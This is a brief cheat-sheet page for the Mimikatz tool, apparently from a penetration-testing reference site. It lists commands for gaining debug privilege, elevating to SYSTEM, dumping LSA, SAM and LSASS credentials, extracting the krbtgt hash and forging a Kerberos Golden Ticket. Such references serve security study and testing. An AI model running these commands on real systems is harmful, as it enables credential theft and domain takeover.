---
title: Mimikatz
desc: Dumps Windows credentials. It also manages Kerberos tickets.
tags: [ActiveDirectory, Kerberos, PostExploitation, Windows]
alts: [Bloodhound, Impacket]
website: https://github.com/gentilkiwi/mimikatz
render_with_liquid: false
---

```sh
# Start
mimikatz

# Check if mimikatz running as an administrator
mimikatz # privilege::debug

# Elevate to SYSTEM level.
mimikatz # token::elevate

# Dump hashes
mimikatz # lsadump::lsa /patch

# Dump hash and security identifier of the Kerberos Ticket Granting Ticket account
mimikatz # lsadump::lsa /inject /name:krbtgt

# Dump all SAM local password hashes
mimikatz # lsadump::sam

# Dump credentials from the LSASS memory
mimikatz # sekurlsa::logonpasswords

# Create a Kerberos Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:sample.domain /sid
:S-1-5-21-849420856-2351964222-986696166 /krbtgt:7808900312cc005cf7082a9a89eb
dfdf /id:500

# Open a new command prompt
mimikatz # misc::cmd
```